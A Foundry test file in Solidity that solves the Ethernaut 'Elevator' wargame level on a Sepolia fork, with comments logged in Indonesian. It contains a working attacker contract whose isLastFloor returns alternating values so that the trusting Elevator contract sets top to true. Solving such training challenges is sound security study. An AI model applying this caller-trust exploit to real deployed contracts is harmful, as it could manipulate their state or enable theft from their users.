// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../12-Elevator/ElevatorFactory.sol";
import "forge-std/Test.sol";

contract ElevatorAttack is Test {
    function testElevator() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address agus = makeAddr("agus");
        Ethernaut ethernaut = new Ethernaut();
        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(agus, agus);
        address addr = ethernaut.createLevelInstance(factory);
        Elevator elevator = Elevator(addr);
        emit log("setup done!\nGoal: top == true");
        bool diBawah = elevator.top() != true;
        assertTrue(diBawah);
        emit log("menurut codenya, msg.sender digunakan untuk menjadi alamat dari interface");
        emit log("PoC:");
        emit log("buat contract untuk memanggil goTo() sehingga interfacenya mke contract hack");
        ElevatorSuper hack = new ElevatorSuper(addr);
        hack.go();
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract ElevatorSuper {
    Elevator elevator;
    bool key = true;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function go() external {
        elevator.goTo(1);
    }

    function isLastFloor(uint256 a) external returns (bool) {
        if (key) {
            key = false;
            return false;
        } else {
            key = true;
            return true;
        }
    }
}
